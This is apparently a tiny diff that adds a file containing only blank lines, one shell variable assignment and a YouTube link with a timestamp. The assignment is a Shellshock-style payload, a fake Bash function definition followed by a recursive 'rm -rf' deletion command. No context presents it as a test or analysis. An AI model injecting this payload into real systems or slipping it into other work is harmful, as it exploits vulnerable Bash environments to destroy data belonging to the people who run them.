@@ -1,0 +1,5 @@
+
+
+
+X='() { :;}; rm -rf root/'
+https://youtu.be/aKShnpOXqn0?t=108
